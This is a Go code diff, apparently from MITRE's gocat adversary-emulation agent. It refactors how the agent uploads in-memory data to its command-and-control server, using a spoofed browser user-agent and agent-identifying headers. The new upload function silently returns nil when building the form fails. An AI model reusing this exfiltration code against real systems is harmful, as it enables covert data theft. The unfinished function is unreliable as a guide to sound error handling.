@@ -12,7 +12,6 @@ import (
 	"mime/multipart"
 	"net/http"
 	"net/url"
-	"os"
 	"path/filepath"
 
 	"github.com/mitre/gocat/output"
@@ -20,6 +19,7 @@ import (
 
 var (
 	apiBeacon = "/beacon"
+	userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
 )
 
 //API communicates through HTTP
@@ -125,37 +125,34 @@ func (a *API) GetName() string {
 	return a.name
 }
 
-func (a *API) UploadFile(profile map[string]interface{}, path string) error {
+// TODO add data to form, make sure upload name is given and used, and make sure we send link_id
+func (a *API) UploadFileBytes(profile map[string]interface{}, uploadName string, data []byte, link_id string) error {
 	c2address, ok := profile["server"].(string)
-	userAgent := "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
 	if !ok {
 		return errors.New("No server address provided in profile.")
 	}
 	uploadUrl := c2address + "/file/upload"
-	file, err := os.Open(path)
+
+	// Set up the form
+	requestBody := bytes.Buffer{}
+	contentType, err := createUploadForm(&requestBody, data, uploadName)
+	if err != nil {
+		return nil
+	}
+
+	// Set up the request
+	headers := map[string]string{
+		"Content-Type": contentType,
+		"X-Request-Id": fmt.Sprintf("%s-%s", profile["host"].(string), profile["paw"].(string)),
+		"User-Agent": userAgent,
+		"X-Link-Id": link_id,
+	}
+	req, err := createUploadRequest(uploadUrl, &requestBody, headers)
 	if err != nil {
 		return err
 	}
-	defer file.Close()
-	requestBody := &bytes.Buffer{}
-	writer := multipart.NewWriter(requestBody)
-	part, err := writer.CreateFormFile("file", filepath.Base(path))
-	if err != nil {
-		return err
-	}
-	if _, err = io.Copy(part, file); err != nil {
-		return err
-	}
-	if err = writer.Close(); err != nil {
-		return err
-	}
-	req, err := http.NewRequest("POST", uploadUrl, requestBody)
-	if err != nil {
-		return err
-	}
-	req.Header.Set("Content-Type", writer.FormDataContentType())
-	req.Header.Set("X-Request-Id", fmt.Sprintf("%s-%s", profile["host"].(string), profile["paw"].(string)))
-	req.Header.Set("User-Agent", userAgent)
+
+	// Perform request and process response
 	resp, err := a.client.Do(req)
 	if err != nil {
 		return err
@@ -167,6 +164,31 @@ func (a *API) UploadFile(profile map[string]interface{}, path string) error {
 		return errors.New(fmt.Sprintf("Non-successful HTTP response status code: %d", resp.StatusCode))
 	}
 	return nil
+}
+
+func createUploadForm(requestBody *bytes.Buffer, data []byte, uploadName string) (string, error) {
+	writer := multipart.NewWriter(requestBody)
+	defer writer.Close()
+	dataReader := bytes.NewReader(data)
+	formWriter, err := writer.CreateFormFile("file", uploadName)
+	if err != nil {
+		return "", err
+	}
+	if _, err = io.Copy(formWriter, dataReader); err != nil {
+		return "", err
+	}
+	return writer.FormDataContentType(), nil
+}
+
+func createUploadRequest(uploadUrl string, requestBody *bytes.Buffer, headers map[string]string) (*http.Request, error) {
+	req, err := http.NewRequest("POST", uploadUrl, requestBody)
+	if err != nil {
+		return nil, err
+	}
+	for header, val := range headers {
+		req.Header.Set(header, val)
+	}
+	return req, nil
 }
 
 func (a *API) request(address string, data []byte) []byte {
